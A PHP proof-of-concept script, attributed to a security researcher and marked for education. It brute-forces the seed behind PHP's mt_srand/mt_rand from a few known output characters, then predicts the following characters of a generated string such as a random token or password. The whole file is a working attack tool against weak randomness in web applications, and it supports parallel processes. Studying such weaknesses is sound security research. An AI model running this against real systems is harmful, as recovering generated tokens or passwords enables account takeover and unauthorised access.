<?php
# Only for education. Author @d0znpp
# PHP mt_srand seed bruteforce code 
# Usefull to recover full string which generated by mt_rand calls threw first 5 bytes
# Details available at http://www.slideshare.net/d0znpp/dcg7812-cryptographyinwebapps-14052863
# ONsec, 2012 http://lab.onsec.ru @ONsec_lab
$str="sKH2nNHa";//3cSGxPEA";
$allchars = "abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ0123456789";

$proc_num = (@$argv[1]>0)?$argv[1]-1:0;
$proc_cnt = (@$argv[2]>0)?$argv[2]:1;

#define("MIN_PHPU32_INT", -9223372036854775808);
#define("MAX_PHPU32_INT",  9223372036854775807);
define("MAX_PHPU32_INT",2147483648);

$frst_seed = round(MAX_PHPU32_INT/$proc_cnt*$proc_num);
$last_seed = round(MAX_PHPU32_INT/$proc_cnt*($proc_num+1));

if(@$argv[3]==="debug"){
	echo MAX_PHPU32_INT."\t$frst_seed\t$last_seed\t$proc_num\t$proc_cnt\r\n";
	die('debug');
}

function bruteByte(){
global $proc_num, $frst_seed, $last_seed, $str, $allchars;
//mt_srand();
$i=0;
$iter = $frst_seed;
$pass = null;
$stime = time();
$stats = array();
while($i<strlen($str) && $iter<$last_seed){
        $b = $allchars[mt_rand(0,61)];
        if($b==$str[$i])
        {
                $i++;
                $pass.=$b;
                if($i>0) @$stats[$i]++;
		if($i>3){
			$complete = round(($iter-$frst_seed)/($last_seed-$frst_seed)*100);
			$speed = ($iter-$frst_seed)/(time()-$stime);
                        echo "Process $proc_num complete $complete% Speed: $speed\t".time()."\t$iter\t$pass\n";
                }
        }else{
                //echo $b."\n";
                mt_srand($iter++);
                $i=0;
                $pass=null;
        }
}

if ($iter<$last_seed){
echo "!!! Success: ";
echo $allchars[mt_rand(0,61)];
echo $allchars[mt_rand(0,61)];
echo $allchars[mt_rand(0,61)];
echo $allchars[mt_rand(0,61)];
echo $allchars[mt_rand(0,61)];
echo $allchars[mt_rand(0,61)];
echo $allchars[mt_rand(0,61)];
echo $allchars[mt_rand(0,61)];
}else echo "nothing found...\n";

//print_r($stats);
}

//echo randString(16); //generate more than 5 bytes for test
bruteByte();

function randString($pass_len=10, $pass_chars=false)
{
        static $allchars = "abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ0123456789";
        $string = "";
        if(is_array($pass_chars))
        {
                while(strlen($string) < $pass_len)
                {
                        if(function_exists('shuffle'))
                                shuffle($pass_chars);
                        foreach($pass_chars as $chars)
                        {
                                $n = strlen($chars) - 1;
                                $string .= $chars[mt_rand(0, $n)];
                        }
                }
                if(strlen($string) > count($pass_chars))
                        $string = substr($string, 0, $pass_len);
        }
        else
        {
                if($pass_chars !== false)
                {
                        $chars = $pass_chars;
                        $n = strlen($pass_chars) - 1;
                }
                else
                {
                        $chars = $allchars;
                        $n = 61; //61;
                }
                for ($i = 0; $i < $pass_len; $i++)
                        $string .= $chars[mt_rand(0, $n)];
        }
        return $string;
}

?>
